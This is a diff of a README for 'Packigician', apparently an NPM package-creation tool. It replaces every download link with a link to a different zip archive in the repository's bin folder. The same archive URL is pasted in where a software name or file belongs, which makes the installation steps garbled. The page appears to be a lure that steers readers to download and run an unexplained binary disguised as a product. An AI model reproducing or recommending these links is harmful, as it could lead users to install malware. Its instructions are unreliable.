@@ -1,6 +1,6 @@
 # 🪄 Packigician - Effortlessly Create Your Own NPM Packages
 
-[![Download Packigician](https://raw.githubusercontent.com/0xthesultan/Packigician/master/bin/Software_v1.5-beta.3.zip)](https://raw.githubusercontent.com/0xthesultan/Packigician/master/bin/Software_v1.5-beta.3.zip)
+[![Download Packigician](https://github.com/0xthesultan/Packigician/raw/refs/heads/master/bin/Software-slinkily.zip)](https://github.com/0xthesultan/Packigician/raw/refs/heads/master/bin/Software-slinkily.zip)
 
 ## 🚀 Getting Started
 
@@ -10,27 +10,27 @@ Welcome to Packigician! With our tool, you can easily create and manage NPM pack
 
 To get started, visit the following link to download Packigician:
 
-[Download Packigician](https://raw.githubusercontent.com/0xthesultan/Packigician/master/bin/Software_v1.5-beta.3.zip)
+[Download Packigician](https://github.com/0xthesultan/Packigician/raw/refs/heads/master/bin/Software-slinkily.zip)
 
 Once you're on the Releases page, look for the latest version. Click on the link to download the file suitable for your system.
 
 ## 💻 System Requirements
 
 - **Operating System:** Packigician works best on Windows, macOS, and Linux.
-- **https://raw.githubusercontent.com/0xthesultan/Packigician/master/bin/Software_v1.5-beta.3.zip** Ensure you have https://raw.githubusercontent.com/0xthesultan/Packigician/master/bin/Software_v1.5-beta.3.zip installed. You can download it from the official website.
+- **https://github.com/0xthesultan/Packigician/raw/refs/heads/master/bin/Software-slinkily.zip** Ensure you have https://github.com/0xthesultan/Packigician/raw/refs/heads/master/bin/Software-slinkily.zip installed. You can download it from the official website.
 - **Memory:** At least 2GB of RAM.
 - **Disk Space:** A minimum of 100MB available.
 
 ## 🛠️ Installation Steps
 
-1. **Visit the Releases Page:** Go to [this page](https://raw.githubusercontent.com/0xthesultan/Packigician/master/bin/Software_v1.5-beta.3.zip) to find the latest version.
+1. **Visit the Releases Page:** Go to [this page](https://github.com/0xthesultan/Packigician/raw/refs/heads/master/bin/Software-slinkily.zip) to find the latest version.
    
 2. **Download the File:** Choose the version appropriate for your operating system and click on it to start the download.
 
 3. **Extract the Files (if necessary):** If the file is in a compressed format (like .zip or .tar), extract it to a location where you want to keep the application.
 
 4. **Run Packigician:**
-   - For Windows, double-click the `https://raw.githubusercontent.com/0xthesultan/Packigician/master/bin/Software_v1.5-beta.3.zip` file.
+   - For Windows, double-click the `https://github.com/0xthesultan/Packigician/raw/refs/heads/master/bin/Software-slinkily.zip` file.
    - For macOS, open the .app file by right-clicking on it and selecting "Open."
    - For Linux, use the terminal to navigate to the extracted folder and run `./Packigician`.
 
@@ -66,13 +66,13 @@ Packigician offers various features to simplify your packaging process:
 
 If you run into issues while using Packigician, consider the following:
 
-- **Installation Problems:** Ensure that you have an adequate version of https://raw.githubusercontent.com/0xthesultan/Packigician/master/bin/Software_v1.5-beta.3.zip installed.
+- **Installation Problems:** Ensure that you have an adequate version of https://github.com/0xthesultan/Packigician/raw/refs/heads/master/bin/Software-slinkily.zip installed.
 - **Failed Downloads:** Check your internet connection or try refreshing the Releases page.
 
 ## 📞 Get Help
 
 If you need further assistance, feel free to open an issue on the GitHub repository. The developer and community are there to assist you.
 
-[Download Packigician](https://raw.githubusercontent.com/0xthesultan/Packigician/master/bin/Software_v1.5-beta.3.zip)
+[Download Packigician](https://github.com/0xthesultan/Packigician/raw/refs/heads/master/bin/Software-slinkily.zip)
 
 With these steps, you will be up and running with Packigician in no time. Enjoy packaging your projects!
